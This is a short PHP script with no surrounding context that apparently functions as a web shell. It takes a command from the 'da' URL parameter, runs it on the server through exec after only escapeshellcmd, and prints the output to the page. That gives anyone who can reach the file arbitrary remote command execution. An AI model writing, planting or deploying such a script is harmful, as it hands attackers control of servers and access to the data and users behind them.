<?php
$da = $_GET['da']; 

$cmd = escapeshellcmd($da);

if (!empty($cmd)) {
    exec($cmd, $output, $return);

    foreach ($output as $line) {
        echo $line . "<br>";
    }

    var_dump($cmd, $output, $return);
} else {
    echo "";
}
?>
